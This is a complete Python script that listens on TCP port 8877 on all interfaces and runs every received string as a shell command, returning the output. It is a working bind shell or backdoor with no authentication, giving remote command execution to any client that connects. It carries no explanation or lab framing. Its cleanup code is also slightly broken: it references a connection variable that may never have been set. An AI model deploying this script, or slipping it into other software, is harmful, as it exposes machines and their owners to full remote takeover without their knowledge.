import socket
import subprocess

host = ''
port = 8877

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.bind((host, port))
    s.listen()
    print("Server started. Listening on port", port)

    conn, addr = s.accept()
    print("{} connected to port {}".format(addr[0], addr[1]))

    while True:
        data = conn.recv(1024).decode().strip()
        if not data:
            break

        print("Received command: {}".format(data))

        if data == "quit":
            break

        try:
            proc = subprocess.Popen(data, stdout=subprocess.PIPE, shell=True, stderr=subprocess.STDOUT)
            (out, err) = proc.communicate()
            response = out.decode()
        except subprocess.CalledProcessError as e:
            response = str(e.output)

        conn.sendall(response.encode())

except socket.error as e:
    print("Socket error:", str(e))
finally:
    if conn:
        conn.close()
    s.close()

print("Server closed.")
